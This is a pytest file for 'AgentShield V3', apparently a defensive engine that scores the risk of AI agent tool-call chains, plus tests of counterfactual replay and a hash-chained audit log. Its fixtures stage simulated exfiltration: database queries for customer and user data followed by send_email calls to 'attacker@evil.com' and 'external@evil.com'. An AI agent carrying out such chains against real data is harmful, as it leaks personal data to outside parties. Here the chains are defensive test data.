"""AgentShield V3 - Credibility Verification Tests.

Validates that the system is not just feature-stacked but scientifically credible:
1. Graph context actually changes decisions (not a single-step classifier)
2. Counterfactual replay actually reduces graph risk (not fake analysis)
3. Audit hash chain is valid
4. No label leakage in detector code
"""

import sys
from pathlib import Path
from unittest.mock import patch

import pytest

_CURRENT_DIR = Path(__file__).parent.resolve()
_BACKEND_DIR = _CURRENT_DIR.parent
WORKSPACE = str(_BACKEND_DIR)
for path in [WORKSPACE]:
    while path in sys.path:
        sys.path.remove(path)
    sys.path.insert(0, path)


def _make_risk_state(combined_risk_target: float):
    """Create a GraphRiskState that produces approximately the target combined_risk."""
    from app.shield.risk_signals import GraphRiskState
    return GraphRiskState(
        local_risk=combined_risk_target,
        inherited_risk=combined_risk_target,
        downstream_exposure=combined_risk_target,
        path_risk=combined_risk_target,
        intervention_value=combined_risk_target,
        confidence=1.0,
    )


# ─── Test 1: Graph Context Changes Decision ──────────────────────────────────


class TestGraphContextChangesDecision:
    """Verify the system is chain-aware, not a single-step classifier.

    A sensitive source followed by an external sink should increase
    inherited_risk and push the decision toward BLOCK.
    """

    def test_sensitive_source_then_external_sink_risk_increases(self):
        """After a sensitive SQL query, an email to external should see higher risk."""
        from app.shield.v3_engine import V3ShieldEngine

        engine = V3ShieldEngine(session_id="graph-context-test")

        # Step 1: sensitive data access
        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.3),
        ):
            step1 = engine.process_tool_call(
                agent_id="data_agent",
                tool_name="execute_sql",
                params={"query": "SELECT email, phone FROM customers"},
                risk_score=0.2,
            )

        # Step 2: external exfiltration with parent link
        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.7),
        ):
            step2 = engine.process_tool_call(
                agent_id="export_agent",
                tool_name="send_email",
                params={"to": "external@example.com", "body": "attached customer export"},
                parent_node_id=step1["node_id"],
                risk_score=0.3,
            )

        # The second step should have higher risk than the first
        assert step2["risk_score"] > step1["risk_score"], (
            f"Chain-aware system should escalate risk for sensitive→external path, "
            f"but got step1={step1['risk_score']:.3f}, step2={step2['risk_score']:.3f}"
        )

        # Graph risk state should show inherited risk
        grs = step2.get("graph_risk_state")
        assert grs is not None, "graph_risk_state should be present"
        assert grs["inherited_risk"] > 0, (
            f"inherited_risk should be > 0 for child of sensitive node, got {grs['inherited_risk']}"
        )

    def test_isolated_low_risk_calls_stay_low(self):
        """Two independent low-risk calls should not amplify each other."""
        from app.shield.v3_engine import V3ShieldEngine

        engine = V3ShieldEngine(session_id="graph-isolated-test")

        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.1),
        ):
            step1 = engine.process_tool_call(
                agent_id="agent_a",
                tool_name="read_file",
                params={"path": "/etc/hostname"},
                risk_score=0.1,
            )

        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.15),
        ):
            step2 = engine.process_tool_call(
                agent_id="agent_a",
                tool_name="read_file",
                params={"path": "/var/log/syslog"},
                risk_score=0.1,
            )

        # Without parent link, risk should stay low
        assert step2["risk_score"] < 0.5, (
            f"Isolated low-risk calls should stay low, got {step2['risk_score']:.3f}"
        )


# ─── Test 2: Counterfactual Replay Reduces Graph Risk ────────────────────────


class TestCounterfactualReplay:
    """Verify that counterfactual intervention actually changes the graph."""

    def test_counterfactual_replay_reduces_graph_risk(self):
        """Removing a risky event should reduce the graph's total risk."""
        from app.shield.v3_engine import V3ShieldEngine
        from app.shield.counterfactual import CounterfactualEngine

        engine = V3ShieldEngine(session_id="cf-replay-test", enable_counterfactual=True)

        # Build an exfiltration chain: SQL -> export -> email
        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.3),
        ):
            step1 = engine.process_tool_call(
                agent_id="data_agent",
                tool_name="execute_sql",
                params={"query": "SELECT * FROM users"},
                risk_score=0.3,
            )

        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.5),
        ):
            step2 = engine.process_tool_call(
                agent_id="export_agent",
                tool_name="export_csv",
                params={"table": "users"},
                parent_node_id=step1["node_id"],
                risk_score=0.5,
            )

        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.9),
        ):
            step3 = engine.process_tool_call(
                agent_id="exfil_agent",
                tool_name="send_email",
                params={"to": "attacker@evil.com"},
                parent_node_id=step2["node_id"],
                risk_score=0.9,
            )

        # Analyze counterfactual: what if we blocked the export step?
        cf_engine = CounterfactualEngine()
        outcome = cf_engine.analyze_intervention(
            graph=engine.behavior_graph,
            event_id=step2["node_id"],
        )

        # Modified risk should be less than original risk
        assert outcome.modified_risk < outcome.original_risk, (
            f"Counterfactual replay should reduce risk, "
            f"original={outcome.original_risk:.4f}, modified={outcome.modified_risk:.4f}"
        )

        # Risk delta should be negative
        assert outcome.risk_delta <= 0, (
            f"risk_delta should be <= 0, got {outcome.risk_delta:.4f}"
        )

        # Prevented downstream risk should be non-negative
        assert outcome.prevented_downstream_risk >= 0, (
            f"prevented_downstream_risk should be >= 0, got {outcome.prevented_downstream_risk:.4f}"
        )

        # Net value should be computed
        assert outcome.net_value is not None, "net_value should be computed"

        # Business cost should be computed
        assert outcome.business_cost > 0, (
            f"business_cost should be > 0, got {outcome.business_cost:.4f}"
        )

    def test_counterfactual_fields_match_contract(self):
        """Verify the counterfactual output matches the expected contract."""
        from app.shield.v3_engine import V3ShieldEngine
        from app.shield.counterfactual import CounterfactualEngine

        engine = V3ShieldEngine(session_id="cf-contract-test", enable_counterfactual=True)

        with patch.object(
            engine._risk_extractor,
            "compute_graph_risk_state",
            return_value=_make_risk_state(0.95),
        ):
            result = engine.process_tool_call(
                agent_id="risky_agent",
                tool_name="send_email",
                params={"to": "external@evil.com", "body": "secret data"},
                risk_score=0.95,
            )

        whatif = result.get("whatif_result")
        assert whatif is not None, "whatif_result should be present for high-risk calls"

        required_fields = [
            "scenario_id", "removed_event_id",
            "original_risk", "modified_risk", "risk_delta",
            "prevented_downstream_risk", "business_cost", "net_value",
            "downstream_events_affected", "recommended", "reason",
        ]
        for field_name in required_fields:
            assert field_name in whatif, (
                f"Missing required field '{field_name}' in whatif_result"
            )

        assert whatif["modified_risk"] <= whatif["original_risk"], (
            f"modified_risk ({whatif['modified_risk']}) should be <= original_risk ({whatif['original_risk']})"
        )


# ─── Test 3: Audit Hash Chain Valid ──────────────────────────────────────────


class TestAuditHashChain:
    """Verify the append-only audit log has a valid hash chain."""

    def test_audit_hash_chain_valid(self):
        """The audit log's hash chain should be valid after multiple operations."""
        from app.shield.audit_log import AppendOnlyAuditLog

        audit = AppendOnlyAuditLog()
        audit.append(event="TOOL_CALL_PROCESSED", session_id="s1", data={"tool": "read_file"})
        audit.append(event="TOOL_CALL_PROCESSED", session_id="s1", data={"tool": "send_email"})
        audit.append(event="DECISION_MADE", session_id="s1", data={"action": "BLOCK"})

        records = audit.export_records()
        assert len(records) == 3

        # Verify hash chain
        for i, record in enumerate(records):
            assert "record_hash" in record, f"Record {i} missing 'record_hash' field"
            assert "previous_hash" in record, f"Record {i} missing 'previous_hash' field"
            if i > 0:
                assert record["previous_hash"] == records[i - 1]["record_hash"], (
                    f"Hash chain broken at record {i}: "
                    f"previous_hash={record['previous_hash'][:16]}... != "
                    f"prev hash={records[i-1]['record_hash'][:16]}..."
                )

        # Verify chain integrity
        assert audit.verify_chain() is True, "Audit log chain verification failed"

    def test_audit_log_is_append_only(self):
        """Audit records should not be modifiable after creation."""
        from app.shield.audit_log import AppendOnlyAuditLog

        audit = AppendOnlyAuditLog()
        audit.append(event="EVENT_A", session_id="s1", data={"data": "test"})

        records = audit.export_records()
        original_hash = records[0]["record_hash"]

        # Verify that tampering would be detected
        audit.append(event="EVENT_B", session_id="s1", data={"data": "test2"})
        assert audit.verify_chain() is True
